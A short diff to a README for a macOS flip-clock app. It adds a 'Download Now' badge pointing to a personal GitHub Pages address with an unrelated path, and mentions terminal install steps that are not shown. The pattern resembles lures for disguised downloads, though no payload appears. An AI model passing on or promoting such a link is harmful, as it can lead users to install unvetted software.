@@ -3,7 +3,7 @@
 
 Flip Clock For Mac is a sleek, minimalist desktop clock application designed for macOS, offering a stylish way to keep track of time. Follow the instructions below to install it effortlessly on your Mac. 🕒
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/flipclock)
 
 If you encounter issues downloading via the button above, follow the terminal-based installation instructions below.
 
